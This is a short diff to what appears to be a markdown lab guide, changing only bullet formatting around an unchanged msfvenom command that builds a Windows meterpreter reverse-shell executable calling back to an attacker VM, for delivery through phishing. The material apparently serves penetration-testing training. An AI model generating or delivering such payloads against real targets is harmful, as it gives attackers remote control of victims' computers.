@@ -46,9 +46,10 @@ Generate a reverse shell payload to be delivered via phishing.
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe > newpayload.exe
 ```
-•	LHOST = Attacker VM's IP
-•	LPORT = Port for listener (ensure firewall allows it)
-[Replace LHOST with your Ubuntu attacker's IP address.]
+  - LHOST = Attacker VM's IP
+  - LPORT = Port for listener (ensure firewall allows it)
+    
+**Replace LHOST with your Ubuntu attacker's IP address.**
 
 **Check the Payload File:**
 ```bash
